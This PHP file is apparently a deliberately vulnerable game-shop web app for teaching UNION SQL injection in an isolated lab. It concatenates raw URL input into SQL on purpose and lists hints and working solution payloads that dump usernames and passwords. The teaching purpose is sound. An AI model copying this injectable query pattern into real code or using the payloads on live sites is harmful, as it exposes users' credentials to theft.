<?php
/* ============================================================
   VULNERABLE SHOP (video games) — UNION SQL Injection teaching lab
   FOR USE ONLY IN AN ISOLATED LAB / CLASSROOM ENVIRONMENT
   This app is VULNERABLE ON PURPOSE. Do not expose it to the Internet.
   ============================================================ */

/* PHP 8.1+ makes mysqli THROW on errors by default. Switch to the classic
   return-value / errno style so connection problems and (importantly) the
   deliberately broken query at level 4 are shown as an in-page message —
   never a fatal 500. The whole lab depends on students seeing the SQL error. */
mysqli_report(MYSQLI_REPORT_OFF);

/* ---------- DATABASE CONFIGURATION ----------
   Settings can be overridden with env vars (DB_HOST, DB_USER, DB_PASS,
   DB_NAME, DB_PORT). setup.sh passes them to Apache via SetEnv (they arrive
   in $_SERVER); the CLI server passes them via the environment (getenv).
   We read both, then fall back to these defaults. */
$DB_HOST = $_SERVER['DB_HOST'] ?? (getenv('DB_HOST') ?: '127.0.0.1');
$DB_USER = $_SERVER['DB_USER'] ?? (getenv('DB_USER') ?: 'root');
$DB_PASS = $_SERVER['DB_PASS'] ?? ((getenv('DB_PASS') !== false) ? getenv('DB_PASS') : '');   // password if any
$DB_NAME = $_SERVER['DB_NAME'] ?? (getenv('DB_NAME') ?: 'tienda_lab');
$DB_PORT = (int)($_SERVER['DB_PORT'] ?? (getenv('DB_PORT') ?: 3306));

/* ---------- CONNECT + AUTO-INSTALL THE DATABASE ---------- */
function db_connect_and_setup($host, $user, $pass, $name, $port) {
    $mysqli = @new mysqli($host, $user, $pass, '', $port);
    if ($mysqli->connect_errno) {
        return [null, "Could not connect to MySQL/MariaDB: " . $mysqli->connect_error];
    }
    $mysqli->query("CREATE DATABASE IF NOT EXISTS `$name` CHARACTER SET utf8mb4");
    $mysqli->select_db($name);
    $mysqli->set_charset('utf8mb4');

    $mysqli->query("
        CREATE TABLE IF NOT EXISTS products (
            id       INT AUTO_INCREMENT PRIMARY KEY,
            name     VARCHAR(100)  NOT NULL,
            price    DECIMAL(10,2) NOT NULL,
            stock    INT           NOT NULL DEFAULT 0,
            category VARCHAR(50)   NOT NULL DEFAULT 'general'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    ");
    $mysqli->query("
        CREATE TABLE IF NOT EXISTS users (
            id       INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(50)  NOT NULL,
            password VARCHAR(100) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    ");

    $res = $mysqli->query("SELECT COUNT(*) AS c FROM products");
    if ($res && $res->fetch_assoc()['c'] == 0) {
        $mysqli->query("INSERT INTO products (name, price, stock, category) VALUES
            ('Rust',             39.99, 20, 'survival'),
            ('Overwatch 2',      19.99, 30, 'hero-shooter'),
            ('Minecraft',        26.95, 40, 'sandbox'),
            ('Counter-Strike 2',  0.00, 99, 'shooter'),
            ('Valorant',          0.00, 99, 'shooter'),
            ('Fortnite',          0.00, 99, 'battle-royale'),
            ('The Witcher 3',    29.99, 15, 'rpg'),
            ('GTA V',            29.99, 25, 'action'),
            ('Cyberpunk 2077',   59.99, 12, 'rpg'),
            ('Elden Ring',       59.99, 10, 'rpg'),
            ('Stardew Valley',   13.99, 50, 'indie'),
            ('Among Us',          4.99, 60, 'party')
        ");
    }
    $res = $mysqli->query("SELECT COUNT(*) AS c FROM users");
    if ($res && $res->fetch_assoc()['c'] == 0) {
        $mysqli->query("INSERT INTO users (username, password) VALUES
            ('admin',    'S3cr3t_Admin#2026'),
            ('j.smith',  'password123'),
            ('m.garcia', 'qatar2026!'),
            ('a.khan',   'LetMeIn_99'),
            ('s.ali',    'Doha_Winter')
        ");
    }
    return [$mysqli, null];
}

list($db, $dbError) = db_connect_and_setup($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);

/* ---------- LEVEL HANDLING (kept in a cookie, NOT in the URL) ----------
   The level lives in a cookie so the address bar only ever shows ?q=...
   (handy for level 4, where the injection goes in the URL). Clicking a level
   sends ?setlevel=N, which sets the cookie and redirects to a clean URL. */
$BASE = strtok($_SERVER['REQUEST_URI'] ?? '/', '?');   // path without the query string

if (isset($_GET['setlevel'])) {
    $n = (int)$_GET['setlevel'];
    if ($n < 0 || $n > 4) $n = 0;
    setcookie('lab_level', (string)$n, ['path' => '/', 'expires' => time() + 86400]);
    header('Location: ' . $BASE);     // drop the query -> clean URL
    exit;
}

/* ---------- OPTIONAL DATABASE RESET ---------- */
if ($db && isset($_GET['reset'])) {
    $db->query("DROP TABLE IF EXISTS products");
    $db->query("DROP TABLE IF EXISTS users");
    db_connect_and_setup($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME, $DB_PORT);
    header('Location: ' . $BASE);     // the level stays in the cookie
    exit;
}

/* ---------- PRODUCT COVERS (original art, generated inline, offline-friendly) ----------
   These are NOT the games' real artwork; just themed placeholder tiles so the shop
   looks like a shop. The cover is decoration keyed by the product name, NOT a SQL column. */
function game_cover($mono, $c1, $c2) {
    static $n = 0; $n++;
    $id = 'grad' . $n;
    $fs = strlen($mono) > 2 ? 18 : 25;
    return '<svg class="thumb" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">'
         . '<defs><linearGradient id="' . $id . '" x1="0" y1="0" x2="1" y2="1">'
         . '<stop offset="0" stop-color="' . $c1 . '"/><stop offset="1" stop-color="' . $c2 . '"/>'
         . '</linearGradient></defs>'
         . '<rect width="64" height="64" rx="12" fill="url(#' . $id . ')"/>'
         . '<text x="32" y="41" font-family="Arial,Helvetica,sans-serif" font-size="' . $fs . '"'
         . ' font-weight="bold" fill="#ffffff" text-anchor="middle">' . htmlspecialchars($mono) . '</text>'
         . '</svg>';
}
$covers = [
  'Rust'             => game_cover('RU',  '#c0562f', '#5c2012'),
  'Overwatch 2'      => game_cover('OW',  '#f08d24', '#1b6fb3'),
  'Minecraft'        => game_cover('MC',  '#5aa832', '#35611f'),
  'Counter-Strike 2' => game_cover('CS',  '#4a5a68', '#caa023'),
  'Valorant'         => game_cover('VA',  '#fa4454', '#7c1a24'),
  'Fortnite'         => game_cover('FN',  '#8b63ff', '#2f98ff'),
  'The Witcher 3'    => game_cover('W3',  '#9b2d2d', '#262629'),
  'GTA V'            => game_cover('GTA', '#2fae60', '#141414'),
  'Cyberpunk 2077'   => game_cover('CP',  '#d9b80e', '#0893a1'),
  'Elden Ring'       => game_cover('ER',  '#c9a227', '#1a1510'),
  'Stardew Valley'   => game_cover('SV',  '#6fbf3b', '#d9821f'),
  'Among Us'         => game_cover('AU',  '#c1272d', '#343a40'),
];
// Neutral tile (solid fill, safe to repeat) for rows that are NOT real products — e.g. injected users.
$coverPlaceholder = '<svg class="thumb" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">'
    . '<rect width="64" height="64" rx="12" fill="#6b7280"/>'
    . '<text x="32" y="44" font-family="Arial,Helvetica,sans-serif" font-size="32" font-weight="bold"'
    . ' fill="#ffffff" text-anchor="middle">?</text></svg>';

/* ---------- CURRENT LEVEL (read from the cookie, default 0) ---------- */
$level = isset($_COOKIE['lab_level']) ? (int)$_COOKIE['lab_level'] : 0;
if ($level < 0 || $level > 4) $level = 0;

/* ---------- PER-LEVEL TEXT ---------- */
$meta = [
  0 => ['t' => 'Level 0 — Numeric injection',
        'd' => 'Your value goes straight after <code>id = </code>, with no quotes and nothing behind it. The easiest case possible.'],
  1 => ['t' => 'Level 1 — Numeric + comment',
        'd' => 'Same as level 0, but now there is an <code>AND stock &gt; 0</code> behind it. If you don\'t neutralise it, your query will fail.'],
  2 => ['t' => 'Level 2 — Single quotes',
        'd' => 'Now your value sits inside quotes: <code>name = \'...\'</code>. You have to close the quote yourself.'],
  3 => ['t' => 'Level 3 — LIKE + wildcards + ORDER BY',
        'd' => 'Your value sits inside a <code>LIKE \'%...%\'</code>, and there is also an <code>ORDER BY</code> at the end.'],
  4 => ['t' => 'Level 4 — The #/%23 comment',
        'd' => 'This level REMOVES the hyphens <code>-</code> from your input, so <code>-- </code> no longer works. You will have to comment with <code>#</code>… and URL-encode it.'],
];

$hint = [
  0 => 'The shop returns 3 columns (ID, Name, Price), so your UNION needs 3 too. Use the id of a real product (e.g. <code>1</code>) and add your UNION after it — you will see the game AND the users.',
  1 => 'Use an SQL comment <code>-- </code> (mind the trailing space!) to ignore the <code>AND stock &gt; 0</code> that comes after.',
  2 => 'Type a real game name first (e.g. <code>Rust</code>), then close the quote with <code>\'</code>, add your UNION, and comment out the leftover quote with <code>-- </code>. That way the game and the users both show.',
  3 => 'Close the quote, add the UNION and comment out the rest (<code>%\' ORDER BY ...</code>) with <code>-- </code>. All the games show too, because <code>LIKE \'%\'</code> matches them all.',
  4 => 'In MySQL/MariaDB you can also comment with <code>#</code>. BUT if you type <code>#</code> in the address bar, the browser treats it as an anchor and does NOT send it to the server. You must write it encoded as <code>%23</code>.',
];

$solution = [
  0 => "1 UNION SELECT username, password, 3 FROM users",
  1 => "1 UNION SELECT username, password, 3 FROM users-- -",
  2 => "Rust' UNION SELECT username, password, 3 FROM users-- -",
  3 => "' UNION SELECT username, password, 3 FROM users-- -",
  4 => "Rust' UNION SELECT username, password, 3 FROM users%23",
];

/* ---------- VULNERABLE QUERY BUILDING ---------- */
$pre = $suf = $inp = ''; $rawNote = '';
switch ($level) {
  case 0:
    $inp = isset($_GET['q']) ? $_GET['q'] : '1';
    $pre = "SELECT id, name, price FROM products WHERE id = ";
    $suf = "";
    break;
  case 1:
    $inp = isset($_GET['q']) ? $_GET['q'] : '1';
    $pre = "SELECT id, name, price FROM products WHERE id = ";
    $suf = " AND stock > 0";
    break;
  case 2:
    $inp = isset($_GET['q']) ? $_GET['q'] : 'Rust';
    $pre = "SELECT id, name, price FROM products WHERE name = '";
    $suf = "'";
    break;
  case 3:
    $inp = isset($_GET['q']) ? $_GET['q'] : 'a';
    $pre = "SELECT id, name, price FROM products WHERE name LIKE '%";
    $suf = "%' ORDER BY price ASC";
    break;
  case 4:
    $raw = isset($_GET['q']) ? $_GET['q'] : 'Rust';
    $inp = str_replace('-', '', $raw);          // FILTER: strips hyphens -> forces the use of #
    if ($raw !== $inp) $rawNote = "Input filtered: the hyphens « - » were removed.";
    $pre = "SELECT id, name, price FROM products WHERE name = '";
    $suf = "'";
    break;
}
$sqlActual  = $pre . $inp . $suf;   // what actually gets EXECUTED
$sqlDisplay = htmlspecialchars($pre)
            . '<span class="inj">' . htmlspecialchars($inp) . '</span>'
            . htmlspecialchars($suf);

/* ---------- PHP CODE SNIPPET (shows how the param is glued into the query) ----------
   Mirrors the real code above, per level, so students see $_GET['q'] being
   concatenated straight into the SQL string. The input part is highlighted. */
$qExpr = ($level === 4) ? "str_replace('-', '', \$_GET['q'])" : "\$_GET['q']";
$qNote = ($level === 4) ? '   // your input, with the hyphens stripped'
                        : '   // your input, taken raw from the URL';
$codeDisplay =
      '$q   = <span class="inj">' . htmlspecialchars($qExpr) . '</span>;' . $qNote . "\n"
    . '$sql = "' . htmlspecialchars($pre) . '" . <span class="inj">$q</span>'
    . ($suf !== '' ? ' . "' . htmlspecialchars($suf) . '"' : '') . ';' . "\n"
    . '$result = mysqli_query($db, $sql);   // run as-is  ->  VULNERABLE';

/* ---------- EXECUTION ---------- */
$rows = []; $err = null;
if ($db) {
    $result = $db->query($sqlActual);
    if ($result === false) {
        $err = $db->error;
    } else {
        while ($r = $result->fetch_row()) $rows[] = $r;
    }
}

/* ---------- DID WE EXTRACT ANY PASSWORD? ---------- */
$solved = false;
if ($db && !$err) {
    $pwds = [];
    if ($pr = $db->query("SELECT password FROM users")) {
        while ($x = $pr->fetch_row()) $pwds[$x[0]] = true;
    }
    foreach ($rows as $r) foreach ($r as $cell) if (isset($pwds[$cell])) { $solved = true; break 2; }
}

/* ---------- CURRENT URL (so they can copy/edit it) ---------- */
$urlActual = $BASE . '?q=' . rawurlencode($inp);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Game Shop — UNION SQLi Lab</title>
<style>
  :root{
    --bg:#f4f6fb; --card:#ffffff; --ink:#1f2733; --muted:#5b6676;
    --line:#dfe4ec; --accent:#2f6fed; --accent2:#1b4fc4;
    --code-bg:#0f1b2d; --code-ink:#d7e3f5; --inj:#ffd24a; --inj-ink:#3a2b00;
    --ok:#1f9d55; --ok-bg:#e8f8ef; --err:#d93636; --err-bg:#fdecec;
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);
       font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}
  header{background:linear-gradient(90deg,var(--accent2),var(--accent));color:#fff;padding:18px 20px}
  header h1{margin:0;font-size:1.35rem}
  header p{margin:4px 0 0;opacity:.9;font-size:.9rem}
  .wrap{max-width:1000px;margin:0 auto;padding:18px 20px 60px}
  nav{display:flex;flex-wrap:wrap;gap:8px;margin:16px 0}
  nav a{padding:9px 16px;border-radius:999px;text-decoration:none;font-weight:600;
        background:#e7edf8;color:var(--accent2);border:1px solid var(--line)}
  nav a.active{background:var(--accent);color:#fff;border-color:var(--accent)}
  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;
        padding:18px 20px;margin:14px 0;box-shadow:0 1px 2px rgba(20,30,50,.04)}
  .goal{border-left:5px solid var(--accent);background:#eef3fd}
  .goal b{color:var(--accent2)}
  h2{margin:.1rem 0 .4rem;font-size:1.15rem}
  code{background:#eef1f6;padding:1px 6px;border-radius:5px;font-size:.92em}
  form{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:6px}
  input[type=text]{flex:1;min-width:260px;padding:11px 12px;font-size:1rem;
        border:1px solid var(--line);border-radius:10px;font-family:ui-monospace,Menlo,Consolas,monospace}
  button{padding:11px 18px;font-size:1rem;font-weight:700;border:0;border-radius:10px;
         background:var(--accent);color:#fff;cursor:pointer}
  button.sec{background:#e7edf8;color:var(--accent2)}
  .label{font-size:.8rem;text-transform:uppercase;letter-spacing:.04em;color:var(--muted);margin-bottom:6px;font-weight:700}
  pre.sql{background:var(--code-bg);color:var(--code-ink);padding:14px 16px;border-radius:12px;
          overflow-x:auto;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:1rem;margin:0}
  .inj{background:var(--inj);color:var(--inj-ink);padding:1px 3px;border-radius:4px;font-weight:700}
  .url{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9rem;color:var(--muted);
       word-break:break-all;background:#eef1f6;padding:8px 10px;border-radius:8px;margin-top:10px}
  table{width:100%;border-collapse:collapse;margin-top:6px;font-size:.98rem}
  th,td{padding:10px 12px;border-bottom:1px solid var(--line);text-align:left;vertical-align:middle}
  th{background:#eef3fd;color:var(--accent2);font-size:.85rem;text-transform:uppercase;letter-spacing:.03em}
  tr:nth-child(even) td{background:#fafbfe}
  th.c,td.c{width:56px;padding-right:0}
  .thumb{width:42px;height:42px;display:block}
  .banner{padding:12px 14px;border-radius:10px;font-weight:600;margin:0 0 12px}
  .ok{background:var(--ok-bg);color:var(--ok);border:1px solid #bfe9cf}
  .error{background:var(--err-bg);color:var(--err);border:1px solid #f5c2c2;
         font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.92rem}
  .note{color:var(--muted);font-size:.9rem;margin-top:8px}
  details{margin-top:10px;border:1px dashed var(--line);border-radius:10px;padding:8px 12px;background:#fafbfe}
  details summary{cursor:pointer;font-weight:700;color:var(--accent2)}
  details pre{margin:10px 0 2px;background:var(--code-bg);color:var(--code-ink);padding:12px;border-radius:10px;
              font-family:ui-monospace,Menlo,Consolas,monospace;overflow-x:auto}
  .cols{color:var(--muted);font-size:.9rem;margin-top:8px}
  .tip{background:#fff8e6;border:1px solid #f3e2a8;border-radius:10px;padding:12px 14px;font-size:.92rem}
</style>
</head>
<body>
<header>
  <h1>🎮 Game Shop</h1>
  <p>UNION SQL Injection teaching lab · ALWAYS watch the query being executed</p>
</header>

<div class="wrap">

  <?php if ($dbError): ?>
    <div class="banner error">⚠️ <?= htmlspecialchars($dbError) ?><br>
    Check the MySQL user/password at the top of <code>index.php</code>,
    or import <code>schema.sql</code> manually.</div>
  <?php endif; ?>

  <nav>
    <?php for ($i = 0; $i <= 4; $i++): ?>
      <a class="<?= $i === $level ? 'active' : '' ?>" href="?setlevel=<?= $i ?>">Level <?= $i ?></a>
    <?php endfor; ?>
    <a href="?reset=1" title="Restore the original data">↺ Reset DB</a>
  </nav>

  <div class="card goal">
    <h2><?= $meta[$level]['t'] ?></h2>
    <p style="margin:.2rem 0 0"><?= $meta[$level]['d'] ?></p>
    <p style="margin:.6rem 0 0"><b>🎯 Goal:</b> make the shop show you the
      <b>usernames and passwords</b> from the <code>users</code> table using <code>UNION SELECT</code>.</p>
  </div>

  <div class="card">
    <div class="label">Store search</div>
    <form method="get" action="<?= htmlspecialchars($BASE) ?>">
      <input type="text" name="q" value="<?= htmlspecialchars($inp) ?>"
             placeholder="Type your search or your injection here…" autofocus>
      <button type="submit">Search</button>
      <a href="<?= htmlspecialchars($BASE) ?>"><button type="button" class="sec">Clear</button></a>
    </form>
    <div class="url"><b>URL:</b> <?= htmlspecialchars($urlActual) ?></div>
  </div>

  <div class="card">
    <div class="label">📝 The PHP code behind it</div>
    <pre class="sql"><?= $codeDisplay ?></pre>
    <div class="cols">The shop takes your input from the URL (<code>$_GET['q']</code>) and
      <b>glues it straight into the SQL text</b>. That gluing is the whole vulnerability: the
      <span class="inj">highlighted</span> part is your data becoming part of the query.</div>
  </div>

  <div class="card">
    <div class="label">🔎 SQL query being executed</div>
    <pre class="sql"><?= $sqlDisplay ?></pre>
    <div class="cols">The <span class="inj">highlighted</span> part is exactly what you typed.
      Columns returned by the shop: <b>ID · Name · Price</b> (3 columns). The small cover is just
      decoration, not part of the query.</div>
    <?php if ($rawNote): ?><div class="note">🧹 <?= htmlspecialchars($rawNote) ?></div><?php endif; ?>
  </div>

  <div class="card">
    <?php if ($solved): ?>
      <div class="banner ok">✅ Level cleared! You extracted credentials from the <code>users</code> table.</div>
    <?php endif; ?>

    <?php if ($err): ?>
      <div class="banner error">❌ SQL error: <?= htmlspecialchars($err) ?></div>
      <div class="note">An error is normal while you experiment: read the message, it tells you what is wrong
        (for example, if the number of columns does not match).</div>
    <?php elseif (empty($rows)): ?>
      <div class="label">Results</div>
      <p class="note">The query returned no rows.</p>
    <?php else: ?>
      <div class="label">Results (<?= count($rows) ?>)</div>
      <table>
        <tr><th class="c"></th><th>ID</th><th>Name</th><th>Price</th></tr>
        <?php foreach ($rows as $r):
            $name = $r[1] ?? '';
            $cover = $covers[$name] ?? $coverPlaceholder;
        ?>
          <tr>
            <td class="c"><?= $cover ?></td>
            <td><?= htmlspecialchars($r[0] ?? '') ?></td>
            <td><?= htmlspecialchars($name) ?></td>
            <td><?= htmlspecialchars($r[2] ?? '') ?></td>
          </tr>
        <?php endforeach; ?>
      </table>
    <?php endif; ?>
  </div>

  <div class="card">
    <details>
      <summary>💡 Hint</summary>
      <p style="margin:.6rem 0 0"><?= $hint[$level] ?></p>
    </details>
    <details>
      <summary>🧩 Solution (open only if you are stuck)</summary>
      <p style="margin:.6rem 0 .2rem">
        <?php if ($level === 4): ?>
          With Level 4 selected, type this after the address (note the <code>%23</code> at the end):
          <pre><?= htmlspecialchars('?q=' . $solution[4]) ?></pre>
          In the search box above it also works typing <code>#</code> instead of <code>%23</code>:
          the browser encodes it for you when you submit the form.
          <pre><?= htmlspecialchars("Rust' UNION SELECT username, password, 3 FROM users#") ?></pre>
        <?php else: ?>
          Type this in the search box above:
          <pre><?= htmlspecialchars($solution[$level]) ?></pre>
        <?php endif; ?>
      </p>
    </details>
  </div>

  <div class="card tip">
    <b>🛠️ Trick for the 3 UNION steps:</b><br>
    1) <b>How many columns?</b> try <code>ORDER BY 1</code>, <code>ORDER BY 2</code>, … until it errors
       (here it is 3), or use <code>UNION SELECT NULL, NULL, NULL</code>.<br>
    2) <b>Which columns are shown?</b> put numbers: <code>UNION SELECT 1, 2, 3</code> and see where they appear.<br>
    3) <b>Dump the data:</b> replace those numbers with <code>username</code> and <code>password</code>:
       <code>UNION SELECT username, password, 3 FROM users</code>.
  </div>

</div>
</body>
</html>
